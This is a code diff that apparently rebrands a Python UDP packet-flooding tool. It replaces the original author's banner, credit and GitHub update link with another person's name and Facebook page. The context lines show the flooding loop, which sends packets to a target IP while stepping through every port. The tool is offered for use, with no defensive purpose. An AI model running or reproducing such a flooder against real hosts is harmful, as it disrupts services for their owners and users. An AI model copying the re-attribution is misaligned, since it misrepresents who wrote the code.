@@ -18,19 +18,19 @@ de_version="1.1"
 colorama.init()
 ################################################################################
 banner=Fore.MAGENTA+'''
-   ▄████████ ███▄▄▄▄    ▄█     ▄███████▄    ▄████████    ▄████████   ▄▄▄▄███▄▄▄▄      ▄████████ ███▄▄▄▄   
-  ███    ███ ███▀▀▀██▄ ███    ███    ███   ███    ███   ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ ███▀▀▀██▄ 
-  ███    █▀  ███   ███ ███▌   ███    ███   ███    █▀    ███    ███ ███   ███   ███   ███    ███ ███   ███ 
-  ███        ███   ███ ███▌   ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ ███   ███   ███   ███    ███ ███   ███ 
-▀███████████ ███   ███ ███▌ ▀█████████▀  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███   ███   ███ ▀███████████ ███   ███ 
-         ███ ███   ███ ███    ███          ███    █▄  ▀███████████ ███   ███   ███   ███    ███ ███   ███ 
-   ▄█    ███ ███   ███ ███    ███          ███    ███   ███    ███ ███   ███   ███   ███    ███ ███   ███ 
- ▄████████▀   ▀█   █▀  █▀    ▄████▀        ██████████   ███    ███  ▀█   ███   █▀    ███    █▀   ▀█   █▀                                          
+
+	██╗  ██╗ █████╗ ███████╗██╗
+	██║ ██╔╝██╔══██╗╚══███╔╝██║
+	█████╔╝ ███████║  ███╔╝ ██║
+	██╔═██╗ ██╔══██║ ███╔╝  ██║
+	██║  ██╗██║  ██║███████╗██║
+	╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝
+                           
 '''+Fore.RESET
 credit=(Fore.CYAN+
-'''                                                                     Author : Bot-Codder
-	                                                             Github  : https://github.com/BOT-CODER
-	                                                             Please contact us in github page                                                           
+'''                               Author : Kazi Ashrafuzzaman 
+	                          Github  : https://www.facebook.com/MR.ERROR.HERE
+	                          Please contact us in Facebook! Enjoy :)                                                         
 '''+Fore.RESET)
 ################################################################################
 #platform info
@@ -65,7 +65,7 @@ def update():
 		print(Fore.RED + "Please update the Program")
 		print("Redirecting...." + Fore.RESET)
 		time.sleep(3)
-		webbrowser.open('https://github.com/BOT-CODER/SniperMan/')
+		webbrowser.open('https://facebook.com/MR.ERROR.HERE')
 		exit()
 	else:
 		pass
@@ -117,7 +117,7 @@ try:
 		sock.sendto(bytes, (ip,port))
 		sent=sent+1
 		port=port+1
-		print(Fore.CYAN+ "Sent %s packet to %s throught port:%s" % (sent, ip, port))
+		print(Fore.CYAN+ "Kazi Sent %s packet to %s throught port:%s" % (sent, ip, port))
 		if port==65534:
 			port=1
 		elif port==1900:
